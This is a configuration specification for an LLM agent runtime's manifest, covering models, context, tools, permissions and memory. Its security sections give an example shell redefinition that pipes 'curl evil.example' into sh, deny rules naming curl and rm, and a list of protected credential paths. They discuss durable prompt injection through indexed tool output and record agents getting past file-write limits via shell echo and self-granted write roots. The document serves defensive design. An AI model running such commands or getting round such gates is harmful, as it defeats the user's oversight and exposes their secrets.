# 02 — Manifest Specification

`agent.yaml` is the single configuration contract. Everything about an agent is either in
this file or referenced from it.

Two equal construction paths:

```bash
dispach run ./agent.yaml
```

```ts
import { Runtime, defineAgent } from "@dispach/core"
const runtime = await Runtime.create({ agents: [defineAgent({ /* same shape */ })] })
```

The YAML path parses into exactly the object the TS builder produces. There is no
YAML-only feature and no TS-only feature.

---

## Full example

```yaml
apiVersion: dispach/v1
id: assistant
name: Moeen's Assistant

model:
  main:
    id: qwen3-8b-instruct
    baseUrl: https://api.example.com/v1
    apiKeyEnv: MODEL_API_KEY
    temperature: 0.3
  selector:
    id: qwen3-1.7b-instruct
    baseUrl: https://api.example.com/v1
    apiKeyEnv: MODEL_API_KEY
  compactor: { $ref: model.selector }

context:
  window: 32768
  reserveOutput: 4096
  observationMaxTokens: 2000
  workspace: ./workspace
  static:
    - AGENTS.md
    - POLICY.md
  volatile:
    - USER.md
    - MEMORY.md
  reminder: REMINDER.md
  thresholds:
    snip: 0.60
    micro: 0.70
    collapse: 0.80
    reset: 0.88
    trim: 0.95

tools:
  dialect: nlt
  providers:
    composio:
      apiKeyEnv: COMPOSIO_API_KEY
      userId: me
  budget:
    max: 24
    reserveWrite: 6
  pinned:
    - GMAIL_FETCH_EMAILS
    - GMAIL_SEND_EMAIL
    - GOOGLECALENDAR_LIST_EVENTS
    - GOOGLECALENDAR_CREATE_EVENT
  search:
    enabled: false
  local:
    - memory_write
    - phase_set

phases:
  default:
    allow: ["*"]

skills:
  dir: ./skills
  maxActive: 1
  threshold: 0.35

memory:
  retriever: fts5
  dir: ./memory
  k: 6

channels:
  - type: telegram
    id: tg
    mode: longpoll
    tokenEnv: TELEGRAM_BOT_TOKEN
    allowFrom: ["@moeen"]
  - type: whatsapp
    id: wa
    authDir: ./.dispach/wa-auth

delivery:
  default: tg

schedules:
  - id: morning-brief
    kind: cron
    expr: "0 8 * * *"
    task: "Summarise today's calendar and unread email."
    deliver: { channel: tg, to: "@moeen" }
    session: isolated

plugins:
  - "@dispach/channel-telegram"
  - "@dispach/tools-composio"
  - spec: "./plugins/custom-metrics"
    config: { endpoint: "http://localhost:9090" }

limits:
  maxSteps: 40
  noProgress:
    identicalCalls: 3
  turnTimeoutMs: 1800000
  toolTimeoutMs: 120000

server:
  enabled: true
  port: 7420
  tokenEnv: DISPACH_API_TOKEN
```

---

## Field reference

### Top level

| Field | Type | Required | Notes |
| --- | --- | --- | --- |
| `apiVersion` | `"dispach/v1"` | yes | Refused if unknown. Never silently upgraded. |
| `id` | string | yes | Slug. Unique within a runtime. Used in session keys and API paths. |
| `name` | string | no | Display only. |
| `extends` | string | no | Path to a base manifest. Shallow merge, arrays replace. |

### `model`

Three roles. `main` required; `selector` and `compactor` fall back to `main`.

| Field | Type | Notes |
| --- | --- | --- |
| `id` | string | Sent verbatim as the `model` parameter. |
| `baseUrl` | string | Must end at the version segment, e.g. `.../v1`. Requests go to `{baseUrl}/chat/completions`. |
| `apiKeyEnv` | string | **Name of the env var**, never the key itself. A literal key in the manifest fails validation. |
| `temperature`, `topP` | number | Optional passthrough. |
| `maxTokens` | number | The cap on what the endpoint may generate. **Omitted from the request entirely when unset** — not derived from `reserveOutput`, which answers a different question. Bounded by `capabilities.maxOutput` and by the window. |
| `reasoningEffort` | `none \| minimal \| low \| medium \| high` | Sent as OpenAI's `reasoning_effort`; omitted entirely when unset. Worth setting to `none` on a reasoning model doing short, well-specified work — measured on `qwen3.5:9b`, six simultaneous rules with reasoning on burned 2,000 output tokens in 104 s and returned **empty content**, while `none` answered correctly in 2.1 s. It is the other half of the `reserveOutput` lever. Not universally honoured, and an endpoint that ignores it is silent about it. |
| `headers` | map | Extra headers. Values may use `${ENV_VAR}`. |
| `streamUsage` | bool | Ask for token usage in a streamed response. **On by default**; set `false` to stop asking. |
| `capabilities` | object | Override the shipped registry. See below. |

`streamUsage` sends `stream_options: {include_usage: true}`, which is an OpenAI extension rather than
part of `/chat/completions`, so an endpoint that does not know it may reject the whole request. It was
opt-in for that reason until Phase 7A, and portability is now kept a different way: a 400 whose body
names `stream_options` is retried **once** without the field, remembered for the life of the provider,
and reported as an `agent.warning`. The downgrade does not consume a retry attempt.

It is on by default because the compaction ladder runs on a corrected estimate. `prompt_tokens` is the
anchor that corrects it, and `estimateTokens` is measured at **16–20% low** on observation-heavy
prompts — the ones that need compacting — so without usage the correction never leaves 1.0 and
`context.pressure` reports `source: "estimated"` forever. Measured against Ollama on 2026-08-13: it
reports no usage at all without this; with it, `prompt_tokens` and `completion_tokens` arrive as they do
from a hosted endpoint. See `evals/budget/README.md` for the figures.

`$ref: model.selector` reuses another role's definition without repetition.

#### `model.*.capabilities`

Only override when the shipped registry is wrong for your endpoint.

```yaml
capabilities:
  nativeTools: false
  strictSchema: false
  thinking: none          # none | anthropic | openai | deepseek
  promptCache: none       # none | anthropic | openai
  parallelToolCalls: false
  contextWindow: 32768
  maxOutput: 4096
  promptStyle:            # workspace rendering. Every field optional and merged individually
    delimiters: plain     # xml | markdown | plain
    intensity: emphatic   # emphatic | neutral | soft
    examplesIn: system    # system | user — user moves example blocks to a user message (slot 2)
    skillsIn: system      # system | user — carried; consumed when skills arrive in Phase 5
```

Capabilities affect thinking-block replay, cache-breakpoint placement, and workspace rendering
**only**. They never change the tool dialect.

`promptStyle` is **derived from the model id** and each field is merged individually over that
default, so setting `intensity` alone does not silently pin the other three to whatever they were
the day the manifest was written. It is derived rather than tabulated because the capability
registry's patterns cannot express it: `qwen3.5*` matches a 9B and a 72B, which want opposite
`intensity` values, and size — the thing that predicts the inversion — is in the id.

`promptStyle` exists because published prompting guidance is written for frontier models and a
significant fraction of it inverts at 3–8B. Anthropic advises removing emphatic phrasing because
current models overtrigger on it; a 7B model needs that emphasis. Anthropic recommends XML
delimiters, having trained Claude on them; cross-model work finds a 22–37% token penalty for
structured formats with no reliable accuracy gain. Authors write one file and the runtime renders it
per model. Phase 3 measured what getting this wrong costs from the other direction — see decision
4.19, where a single placeholder read as metasyntax by large models and as instruction by a 9B model
moved a benchmark 65 points. The `intensity` default for small models is itself measured: the one
emphatic framing line moves qwen3.5:9b's all-6-rules compliance +20pp with no effect on
deepseek-chat (`evals/prompt-style/`). Full rationale in `07-SPEC-WORKSPACE.md`.

`thinking` says what the loop must *do* with reasoning, and the non-`none` cases disagree:

| Value | Reasoning arrives as | Replayed with tool results |
| --- | --- | --- |
| `none` | not exposed | n/a |
| `anthropic` | separate thinking blocks | **required** — omitting it degrades multi-step reasoning silently |
| `openai` | server-side, opaque | nothing to replay |
| `deepseek` | `reasoning_content`, beside `content` | **no** — sending it back is accepted but buys nothing |

`deepseek` carries a second consequence, and it is the one that actually bites: **reasoning
tokens are billed against the output budget.** A `max_tokens` too small to cover the model's
thinking returns empty content with `finish_reason: "length"`. Measured against
`deepseek-v4-pro` on 2026-08-12: `max_tokens: 16` produced 16 reasoning tokens and no reply.
**`max_tokens` is sent only when `model.<role>.maxTokens` is set.** It is not derived from
`reserveOutput`, and wiring the two together is the mistake this note exists to prevent:
`reserveOutput` decides how much of the window the *prompt* may use, and using it as an output cap
turns a budgeting figure into a hard truncation that lands on the model's thinking. `qwen3.5:9b`
returned empty content against an 8,192 cap nobody had chosen. Left unset, the endpoint applies its
own default. The runtime reports the empty-at-`length` case as a failed turn rather than an empty
success, and names whether the limit was yours or the endpoint's.

`promptCache: none` means there are no breakpoints for the runtime to place. It does not mean
the provider caches nothing: DeepSeek caches context automatically server-side and reports
`prompt_cache_hit_tokens` on every response.

### `context`

| Field | Default | Notes |
| --- | --- | --- |
| `window` | from capabilities | Total token budget. |
| `reserveOutput` | 4096 | How much of the window to keep free for the reply, so the prompt cannot crowd it out. A **prompt-budget** number: it never becomes `max_tokens`. |
| `observationMaxTokens` | 2000 | Above this a single tool observation is trimmed to head+tail with an artifact pointer. |
| `files` | `[]` | **Deprecated.** Alias for `static`, warning at load and naming the replacement. Keeps resolving against the *manifest* directory rather than `workspace`, which is what makes it an alias rather than a rename. Setting both `files` and `static` is a load failure, not a merge. |
| `thresholds` | `snip .60 · micro .70 · collapse .80 · reset .88 · trim .95` | Compaction ladder trigger fractions **of the prompt budget** — `window` minus `reserveOutput`, not of the whole window. Measured against the window, a large reserve lets `assembleContext`'s oldest-first trim run while the ladder still reports mild pressure, which is the common case on a reasoning model. Must be strictly ascending **in stage order** and within `(0, 1)`; validated. The stage order is `snip → micro → collapse → reset → trim`, ordered by how much information each rung destroys rather than how many bytes it frees: `snip` and `micro` leave an `artifact_read` pointer, `collapse` and `reset` leave the meaning as a digest, `trim` leaves nothing. So `trim` is last despite freeing the most, and it is the fallback for the case where a digest would have grown the prompt and the no-growth guard refused it. A manifest ordered for the pre-reorder ladder (`trim` first) is refused by name, with the rewrite in the hint. |

#### Workspace

> Governed by `07-SPEC-WORKSPACE.md`, which supersedes the flat `files` list: an ordered array
> cannot say which files are cache-stable versus volatile, which sit after the conversation
> history, or which the agent may write to — and each of those has a measured cost when got wrong.
> Implemented in full.

| Field | Default | Notes |
| --- | --- | --- |
| `workspace` | `./workspace` | Directory the tier lists resolve against. Relative to the manifest. |
| `static` | `[]` | Tier 0, slot 0. Cache-stable, read-only, before breakpoint A. |
| `volatile` | `[]` | Tier 1, slot 3. Agent-writable, **after** breakpoint A so a write does not invalidate the cached prefix. The **only** writable tier — a `static` or `reminder` file declaring `editable` is refused, not downgraded. |
| `reminder` | none | Tier 2, slot 9. Injected after the conversation history, before the current input. |
| `budgets` | `{static: 2000, volatile: 3500, reminder: 500, total: 6000}` | Hard caps, measured on the *stripped* text. Over budget **fails the load naming the file** — never silent truncation. A ceiling, not a target: everything inside it is paid every turn. |
| `rules` | `{perRuleSuccess: 0.90, reliabilityTarget: 0.80, onExceed: fail}` | Imperative-count guard across static + reminder. At 0.90 a 0.80 target permits two rules, not four. The count is a heuristic and reports every line it counted; `onExceed: warn` is the escape. The file named by `soul.file` counts only its `<rules>` blocks — see `07-SPEC-WORKSPACE.md`. |
| `soul` | none | Capability-gated long-form identity: `file`, `requires` (`contextWindow` comparator, `class: frontier \| small` derived from the model id by size), `onUnmet: distill \| omit \| fail`, and `distilled` (required by `distill`). The selected file loads first in the static tier as the identity document — listing a second identity file ships two identities. Operations (`AGENTS.md`) coexist with it. |
| `compactionNotice` | true | Runtime-generated line telling the model context compacts automatically, so it does not wrap up work early on budget grounds. **Phase 7** — refused at load until then. |

Per-file frontmatter (`tier`, `editable`, `budget`, `eviction`) is stripped before injection, along
with HTML comments — so authoring guidance in a template costs nothing at runtime. A file whose
frontmatter `tier` disagrees with the list that named it fails the load rather than being resolved
in either direction.

A `knowledge` section sits alongside `skills` at the top level, and is Tier 3 — retrieved, never
pinned, so it has no share of the workspace budgets:

| Field | Default | Notes |
| --- | --- | --- |
| `knowledge.dir` | none | Directory of keyword-gated knowledge files. Resolves against the manifest; a missing directory fails the load. |
| `knowledge.maxActive` | 2 | Entries activated in one turn. |
| `knowledge.budget` | 600 | Total across activated entries. An entry alone exceeding it fails the load — it could never activate. |

Each knowledge file declares `keywords:` (required, non-empty) in its frontmatter; matching is
case-insensitive and whole-word against the current input. See `07-SPEC-WORKSPACE.md`.

### `tools`

| Field | Default | Notes |
| --- | --- | --- |
| `dialect` | `nlt` | `nlt` or `native`. Config only — never auto-detected. `native` is refused at load when the resolved model has `capabilities.nativeTools: false`, and when any resolved slug falls outside a native function name's `[A-Za-z0-9_-]{1,64}`. |
| `providers` | `{}` | Map of provider id → that provider's own config: `system`, `web`, `composio`, or anything the embedder registered. Several at once. Each block is validated by its provider, which **refuses an unknown key** rather than ignoring it. Secrets are env var *names*. **Naming an unregistered id fails the load** — resolving nothing instead would blame every pinned slug for one missing registration. |
| `provider` | none | **Deprecated alias** for a single `providers` entry. Still loads, with a `tools_provider_deprecated` warning naming the rewrite. Setting it *and* `providers` is a load failure, not a merge. |
| `providerConfig` | `{}` | Goes with `provider`. Non-empty with no `provider` to apply it to earns `tools_provider_config_orphaned`. |
| `budget.max` | 24 | Hard cap on catalogue size. |
| `budget.reserveWrite` | 6 | Slots held for mutating tools so reads cannot starve writes. |
| `pinned` | `[]` | Slugs resolved at load. **An unknown slug fails the load** with the slug and provider named — unless a provider claims it with `explainUnresolved()`, which is consulted only once a slug is missing after *every* provider has answered. A cold Composio cache reports itself and names the warm command; the generic nearest-match message would blame correct slugs. |
| `search.enabled` | false | Exposes a provider search meta-tool as an escape hatch. Off by default: search-then-execute is two-hop reasoning and small models fail it. |
| `local` | `[]` | Built-in tools: `artifact_read`, `memory_write`, `phase_set`, `handoff`, `now`. `artifact_read` follows the pointer compaction leaves behind, so an agent with compaction enabled and this tool unpinned can see that detail was removed and cannot retrieve it. |
| `policy.mode` | `allow` | What happens to a call no rule mentions. `allow` because **pinning is the primary authorization** — an agent has only the tools its manifest pinned. `ask` on an unattended run means `onNoApprover` answers it, so a schedule would do nothing. |
| `policy.allow` / `policy.deny` | `[]` | `Tool` or `Tool(pattern)`. Evaluated **deny → allow, first match, specificity never reorders** — so a deny carries no exceptions. A rule naming a primary content field (`exec(command:…)`) is refused: a compound command defeats it. |
| `policy.onNoApprover` | `deny` | What `ask` means with nobody to ask — a schedule, a pipe, a channel with no approver. |
| `model.<name>` | — | Beyond `main`, `selector` and `compactor`, any key under `model:` is a **custom role** a schedule may name with `role:`. A role nothing references is warned about, because that is also what a misspelled `compactor` looks like. |
| `untrusted.onMutate` | `refuse` | What to do when untrusted content is in the turn and a mutating tool is requested: `refuse \| confirm \| allow`. A tainted mutating call needs **explicit** authorization — a matching `policy.allow` rule or a live approval; `mode: allow` is the absence of a rule, not one. `confirm` asks when an approver is reachable and refuses when none is. |

**Configuring a remote provider and pinning nothing from it is a valid, startable agent.** A remote
provider resolves from an on-disk cache during boot, where hard rule 4 permits no network call, so
its app tools become available only after their schemas are cached. Pinning such a slug *before*
that fails the load naming the slug and the command. Listing the provider beside one whose tools are
local costs nothing: the cold-cache failure is raised for a slug nobody resolved, never for the
provider merely being present.

**Composio's three meta tools are the exception, and resolve with no cache and no request.**
`composio_search` finds the tools for a task in plain English and writes their real schemas to the
cache; `composio_connect` returns the sign-in link for an account; `composio_workbench` runs Python
in a Composio-hosted sandbox. `init --composio connected` pins the first two and adds
`composio_connect` to `policy.allow` — without that rule the first search taints the turn and the
connect that must follow it has no authorisation to point at.

The workbench is never generated. It runs code somewhere no `tools.policy` rule can reach, which is
a broader grant than `exec`; pin it by hand or not at all.

A slug found by `composio_search` is *pinned*, not executed — the model writes it into
`tools.pinned` with `config_set` and it is an ordinary tool on the next start. There is deliberately
no tool that executes an arbitrary discovered slug: that would make every Composio task two-hop, the
shape small models fail, which is what fixing the catalogue at load exists to avoid.

**A tool that is both `mutating` and `untrusted` is once-per-turn unless a `policy.allow` rule names
it**, and the load says so (`tool_gated_after_first_use`). `exec` is the whole class: its own first
call taints the turn, and the second then has no authorization to point at. This is the gate working,
but it is invisible until a half-finished turn stops, so it is a warning at boot rather than a
surprise mid-turn. It is a warning and not a failure because "run one command and report back" is a
legitimate shape for an agent, and nothing can tell that apart from an oversight. A `deny` rule does
not clear it: `deny` authorizes nothing.

### The `system` provider

Shell execution, from `@dispach/tools-system`. Registered by the `dispach` binary; a manifest
still has to select it and pin the tool, because availability and grant are separate.

```yaml
tools:
  providers:
    system: {}
  pinned: [exec]
  policy:
    allow: ["exec"]                    # or narrower: "exec(git *)", "exec(npm test:*)"
    deny:  ["exec(rm *)", "exec(curl *)"]
```

Eight tools: `exec`, `file_read`, `file_write`, `file_edit`, `glob`, `grep`, `config_read`,
`config_set`. `dispach init --system none|read|write|full` generates a working set and its
permission rules; `write` is files **without** a shell, which is the only configuration in which
"confined to the workspace" is a true statement — see below.

`tools.providers.system` accepts `writeRoots` (extra writable directories) and `protect` (extra
refused paths). Both widen their respective set; nothing narrows either.

`exec` takes `command`, `workdir`, `timeoutMs`, `pty`, and `background`. It takes **no `env`
argument**, deliberately: a per-call environment map is invisible to the policy engine, which matches
the command string, so `{PATH: "/tmp/evil"}` beside `git status` would pass a rule that never saw the
half that mattered. Written inline, `PATH=/tmp/evil git status` is part of the command and the rule
does not match it. The ambient environment *is* inherited, including the agent's `.env`, so a pinned
`exec` can read every secret the agent can.

Each call gets a fresh shell. The working directory carries between calls; the environment does not.
A persistent shell would let one tainted call define `git() { curl evil.example | sh; }` and turn an
`exec(git status:*)` rule into an authorization for attacker code — CVE-2026-32009's shape from
inside the session. The directory is the exception because losing it is a correctness problem, not a
security one, and small models do not reliably re-derive a `cd`.

**The file tools exist so that permissions can work.** A `file_write` call carries a `path` a rule can
match exactly and the protected set can refuse; `echo x > "$F"` carries the same target inside a string
nothing can inspect. Their descriptions route the model away from the shell for that reason, and it is
a security control rather than a style note. A relative path resolves against the shell session's
working directory — the one `exec`'s `cd` moves — so `cd ~/project` then `file_read package.json`
behaves the way a person means it.

`file_edit` matches an exact unique string, never a line number, and **two matches is a failure**:
picking one would be a coin toss that reports success while editing the wrong line. Nothing is written
on either failure path.

### Where writes may go

**Writes are confined to a root.** `<agentDir>/workspace` by default, falling back to the agent's own
directory when there is no workspace. Everything outside is read-only, and the exceptions are
`tools.providers.system.writeRoots` — absolute, or relative to the agent directory. **Nothing said at
runtime can add one**, which is the property that makes the default worth having: an agent that has
misunderstood a request cannot damage anything while misunderstanding it.

A protected list has to anticipate every path worth protecting; a root anticipates nothing. Both
apply, and the protected set wins *inside* the root.

**Reads are deliberately not confined.** Being pointed at a project and asked about it is the ordinary
case, and credentials are refused everywhere already.

**The root does not bind `exec`, and cannot.** Verified: an agent with both had `file_write` refused
outside the root and then wrote the file with `echo … >`. A shell carries its target inside a string
no path check can look inside, so all the root decides is where the shell starts. If "only inside the
workspace" has to be true, the agent cannot have a shell — that is what `--system write` is for.

### Protected paths

Not writable by the file tools, and **no `policy.allow` rule reaches past them**:

| | |
| --- | --- |
| the agent's own definition | `agent.yaml`, `SOUL.md`, `SOUL.compact.md`, `AGENTS.md`, `POLICY.md`, `REMINDER.md` |
| runtime state | any dot-directory under the agent's own directory |
| credentials, anywhere on disk | `.ssh/`, `.aws/`, `.kube/`, `.gnupg/`, `.docker/`, `.env*`, `.netrc`, `.npmrc`, `*.pem`, `*.key` |

Elsewhere this protects config. Here the workspace files **are the agent**, and a rule authorising a
write to them would be a rule authorising its own replacement. `USER.md` and `MEMORY.md` stay writable
— they are the volatile tier `memory_write` exists for. `tools.providers.system.protect` adds patterns;
nothing removes any, because the set contains the policy file.

**Stated rather than discovered: this binds the file tools and not `exec`.** `echo x > SOUL.md` carries
its target inside a shell string where no path check can see it. Pinning `exec` grants more than this
protects.

### The agent's own configuration

`config_read` returns the manifest and every setting `config_set` will change, each with one line on
what it means — so an agent asked for something it cannot do can name the field rather than only
saying no. `config_set` changes one dotted path: it is re-validated against the schema before anything
is written, comments and formatting survive because the *source text* is edited rather than the
document re-serialised, and `policyArg` is the manifest path, so `deny: ["config_set(tools.policy*)"]`
is expressible.

`agent.yaml` stays in the protected set for `file_write`. A whole-file overwrite cannot be validated;
a targeted change can, and an invalid manifest is a failure that shows up at the *next* boot, by which
time the change looked like it succeeded.

**This escalates, and that is the point** — pinning a tool and adding an allow rule is what a person
asks for. Bounded three ways: `config_set` is `mutating`, so the write gate applies; a `deny` rule can
put the security fields out of reach; and two edits are refused whatever the policy says —

| refused edit | why |
| --- | --- |
| a `writeRoots` list anywhere — `tools.providers.<id>.writeRoots`, or nested inside a `tools.providers` value | where the agent may write is the person's decision. Asked to create a file, an agent granted itself the whole home directory and wrote there |
| replacing `tools.policy.deny` | its only purpose is removing a restriction someone set deliberately |
| `tools.untrusted.onMutate: allow` | it turns off the check on outside content driving a write |

A guard the agent can switch off on request is not a guard. Everything else, including `onMutate:
confirm`, is settable.

### Tools that exist and were not enabled

A provider named in `tools.providers` with nothing pinned from it is a **normal and deliberate**
configuration: naming it is what makes `available()` run, and `available()` is the only reason the
model knows a tool it was not given exists. `init` generates `system` and `web` that way.

The model is told, in one line each, which of the provider's tools this manifest did not pin — and
told to name the tool, say it is *not permitted yet* rather than that it is unable, and not to reach
for another tool to work around it. Without this a pinned-down agent is silently less capable than its
own runtime, and only someone reading the manifest can find out why.

Provider-opt-in via `ToolProvider.available?()`, so a catalogue of 25,000 tools omits it entirely.

Not a sandbox. A policy decides *whether* a command runs; a sandbox decides *where*. This ships the
first, and containment stays a deployment concern.

**`tools.search` is about finding a *tool*, not searching the web.** It exposes a meta-tool over the
provider's own catalogue — 25,438 entries, for Composio — so the model can discover a tool it was not
given. Off by design and refused if enabled: search-then-execute is two-hop reasoning, which is where
small models fail. Searching the *internet* is `web_search`, or a pinned `COMPOSIO_SEARCH_*` tool, and
has nothing to do with this field. The two have been confused, so they are stated together here.

**Trust.** Every tool carries `trust`, and a provider-resolved tool defaults to `untrusted` — a
provider cannot know what its upstream API will return, so the default is the one that is wrong
harmlessly. An untrusted observation reaches the model delimited and labelled as data, and cannot
silently drive a mutating call in the same turn. The delimiters are advisory; the write gate is not.

Both dialects render the *same* `ToolSpec`, and both put the same guidance in front of the model —
summary, `whenToUse`, `whenNotToUse`, and a state-change warning for a mutating tool. Under `nlt` that
is prose in context slot 1; under `native` it is the wire format's `function.description`, and the
schema is passed through unchanged. So switching `dialect` changes the channel and nothing about what
the model is told, which is what makes `evals/tools` a comparison of dialects rather than of wording.

#### Providers and the resolution cache

A provider is supplied by the embedder, not resolved by name at runtime — nothing installs while the
process runs:

```ts
Runtime.create({ agents: ["./agent.yaml"], toolProviders: { composio: composioFromConfig } })
```

The `dispach` binary registers `composio` already, so a manifest naming it works from the CLI with
no code.

Resolution happens at agent load, inside the boot sequence, where **no network I/O is permitted**. A
remote provider therefore resolves from `.dispach/tools.cache.json` and catches up after
`runtime.ready`, reporting through the `tools.refreshed` event. Measured on a three-tool Composio
manifest: boot returns in 27 ms and the refresh takes 1,474 ms, so awaiting it would make boot sixty
times slower.

The consequence is that a cold agent must be warmed once — `dispach tools <manifest> --warm`. An
empty cache fails the load naming the slugs and that command, rather than making the call it is not
allowed to make. A warmed agent boots and serves its catalogue with no API key present at all.

`tools.providers.composio` accepts `apiKeyEnv` (default `COMPOSIO_API_KEY`), `userId`, and
`baseUrl`. Anything else is refused: the schema keeps this a free-form record, so nothing upstream
catches `userid` for `userId`, and a silently ignored setting is a configuration that looks applied
and is not.

One consequence worth knowing when reading token figures: under `native` the catalogue is in the
request body rather than in context, so `context.window` is reduced by its estimated cost and
`validate` reports the same total under either dialect.

### `phases`

```yaml
phases:
  triage: { allow: ["tag:read"], entry: true }
  act:    { allow: ["tag:read", "tag:write"] }
```

- `allow` matches slugs, `tag:<name>` annotations from the tool's own spec, or `*` — and nothing else.
  A pattern language here would be a second matcher beside `tools.policy`'s, and the two disagreeing
  about what `exec*` means is worse than not supporting it.
- `entry: true` marks the starting phase; defaults to the first declared, so key order is significant.
- Declaring more than one phase auto-registers `phase_set`, **in every phase**. A phase without it
  would be a phase with no way out, and leaving that to authors to remember is a trap in the format.
- A single implicit `default: { allow: ["*"] }` phase exists if the key is omitted, and one declared
  phase is treated the same way: there is nothing to move to, so no `phase_set` is registered.
- An `allow` entry matching no resolved tool **fails the load**, naming the phase, the entry and the
  available slugs. A phase that silently exposes fewer tools than its author wrote surfaces turns later
  as the agent declining work it should be able to do. The check runs where "resolved" is knowable — at
  agent construction — so `validate` does not perform it.
- A *stored* phase the manifest no longer declares falls back to the entry phase rather than failing.
  That is a rename between runs, not an authoring mistake, and refusing to resume the conversation is
  the worse answer.

Phase state persists per session, in `sessions.phase`. A change takes effect on the **next step of the
same turn**: `triage` → `phase_set("act")` → write, inside one turn, is the point of the feature.

The cost, stated: the catalogue is slot 1, so a change invalidates the cached prefix from slot 1 onward
for that one request. The per-phase catalogue is memoised, so a phase entered twice renders once.

The **current** phase is named in `phase_set`'s own description rather than in the configuration block,
because a phase is per session while that block is memoised per agent and frozen at first use — two
sessions in one process would otherwise render each other's phase.

Measured, and the figure is not the one the rationale predicts: on a frontier model the constraint
**cost** 8–12pp, entirely on tasks whose correct answer is to call no tool. See
`evals/phases/README.md`; the small-model arm, which is what decision 4.8's claim is about, is unrun.

### `skills`

| Field | Default | Notes |
| --- | --- | --- |
| `dir` | `./skills` | Scanned for `*/SKILL.md`. Frontmatter only at boot; a configured directory that does not exist is a load failure. |
| `maxActive` | 1 | Skill bodies injected per turn, into `SLOT.skill`. |
| `threshold` | 0.35 | Normalised BM25 floor. Below it, no skill activates. Calibrated to the normalisation in `skills/select.ts`, where the shipped fixtures score 0.369–0.600 — **changing that formula invalidates this default**. |

There is deliberately **no `budget` field** either. `maxActive` is the only limit on skills: a turn activates
at most that many bodies, so a token cap added no protection and produced a refusal at install, at load and
mid-turn for a file somebody had chosen on purpose — it turned eleven ticked skills into nine installed. A
skill's size is shown in the catalogue on the row where it is chosen, and `skills validate` warns above the
spec's advised 5,000 tokens. Nothing refuses. See decision 11.59.

There is deliberately **no `sources` field**. Where skills come from is a machine-level list — `sources
add`, stored at `~/<stateDir>/sources.json` — and not a property of one agent. Two reasons, and the second
is the binding one: a repository is added once per machine rather than once per agent, and a fetchable URL
inside the document `Runtime.create` loads is an invitation to resolve it during boot, which hard rule 4
forbids. Provenance for what *was* installed lives at `<skills dir>/.origins.json`, written by `skills
install` and shown by `skills list`.

A skill's frontmatter follows the [agentskills.io specification](https://agentskills.io/specification)
verbatim — `name`, `description`, `license`, `compatibility`, `metadata`, `allowed-tools` — and unknown
keys are kept and ignored rather than refused, because these files are third-party. Negative routing
guidance goes under `metadata`, keyed `<brand>-when-not-to-use`; it is warned about by
`skills validate` and never required at load. `allowed-tools` is read and displayed and **never
honoured**: a downloaded folder does not widen what the agent may run.

### `memory`

Two tiers, one writer. `memory_write` appends to the **carried** file — the workspace's write target,
in the `volatile` tier, present in slot 4 on every turn — and when that file passes its budget the
oldest notes move into `dir`, where only retrieval reaches them. So a fact said a minute ago is still
carried, and one from June is found by searching. Nothing is deleted at either step.

| Field | Default | Notes |
| --- | --- | --- |
| `retriever` | `fts5` | The seam. `fts5` is the only implementation; an unknown name is refused at load rather than retrieving nothing. |
| `dir` | `./memory` | Where eviction files older notes, relative to the manifest. Monthly `YYYY-MM.md`. Indexed, never carried. |
| `maxActive` | 5 | Passages injected in one turn, into slot 7. `0` switches injection off while leaving `memory search` working. |
| `threshold` | 0.20 | Normalised score floor, on the same scale as `skills.threshold`. |
| `budget` | 2000 | Total tokens across injected passages. Outside the workspace cap — this tier is retrieved, not carried. |
| `includeHistory` | true | Index the person's messages and the agent's replies as well as the notes, under the source `session:<key>`. **Never tool observations, and never anything else the runtime authored, at any setting.** |

**`maxActive` and `budget` were raised from 3 and 600 when `includeHistory` was implemented**, and the
change was required rather than generous. Those numbers were sized for note bullets, which are one
line. A conversation exchange is a question plus a reply, each capped at 600 characters, so a full one
estimates near 320 tokens and bills nearer 370 — `estimateTokens` runs 16–20% low on exactly this kind
of mixed text. Two exchanges would have exhausted the old budget. The interaction with `selectPassages`
is what makes an undersized budget worse than it looks: it stops at the first passage that does not fit
and never skips past it, so one oversized exchange does not merely go uninjected — it sits at the top
of the ranking and blocks everything behind it.

**What `includeHistory` indexes is an allowlist of prose, not a blocklist of tool output.** Only a
message with no `origin` is indexed; the runtime sets that field on everything it authored itself
(`observation`, `call`, `repair`, `digest`), so a fifth kind added in a later phase is excluded by
default. The direction matters because of what `observation` holds — text a stranger wrote, fetched
from a page or returned by a provider. Indexing it would make prompt injection **durable**: retrieved
into slot 7 in a later session, long after the write gate that fenced it stopped applying. A blocklist
that forgot one origin would open that hole with nothing failing.

Conversations are indexed **at turn end**, not during retrieval — the exchange being asked about does
not exist yet when recall runs — and they are reconciled in their own namespace, separately from the
files. That separation is load-bearing: reconciliation drops any source it was not handed, which is
what makes a deleted archive file stop being retrieved, and one shared pass would delete every indexed
conversation on the next turn's file sync. `memory rebuild` restores **both**, unconditionally, because
clearing the index clears both — which also makes it the backfill for an agent whose sessions predate
this being wired up.

The conversation being had is excluded from its own prompt, for the reason the carried file is: it is
already there, as history. Excluded at *retrieval* rather than left out of the index, so `memory search`
can still find what was said a minute ago.

Omitting the section switches memory off entirely: no slot 7, no index, and `memory search` reports
that the agent has none configured rather than that it remembers nothing. `memory: {}` is enough to
turn it on, since every field has a default.

**`threshold` is lower than `skills.threshold` on purpose.** Both go through `rank/bm25.ts`, so the
numbers are directly comparable — and the two want opposite errors. A wrong skill *displaces* the
right one at `maxActive: 1`, so routing pays for precision; an extra remembered passage costs about
twenty tokens under a budget that already caps the slot, so retrieval pays for recall. Measured: the
note "the deploy pipeline waits for a manual approval gate" scores **0.284** against "how does the
deploy approval work" — it matches two of the query's three informative terms and the normalisation
divides by all three. Correct arithmetic, and a good answer that `0.35` withholds. A full match at
average document length is about `0.45`.

**Retrieval is per turn, never per step**, like `knowledge`: two steps of one turn must not argue
from different remembered facts. Slot 7 is **not pinned** — this tier is retrieved rather than
carried, so compaction may drop it. A fact that must always hold belongs in the carried file.

**Tool observations are never indexed.** That is where untrusted text lives, and indexing it would
make prompt injection durable: text a stranger wrote, retrieved into slot 7 in a later session, long
after the write gate that fenced it stopped applying. `ChatMessage.origin` is what makes the
distinction reliable — under a text dialect an observation returns as a `user` message and the role
does not say.

**Deleting a session leaves memory untouched**, structurally: `memory_passages` carries no session
column and no foreign key, unlike `artifacts`, which cascade with theirs.

`dispach memory search <agent> "<words>"` ranks the corpus exactly as a turn would but applies no
threshold and does not exclude the carried file, because the question it exists to answer is usually
"why was that *not* recalled". `dispach memory rebuild <agent>` forgets the index and re-reads every
file — staleness is detected from mtime **and** size, and an edit preserving both is a real blind
spot rather than a hypothetical one.

### `channels`

Common fields; type-specific fields are validated by the channel's own schema.

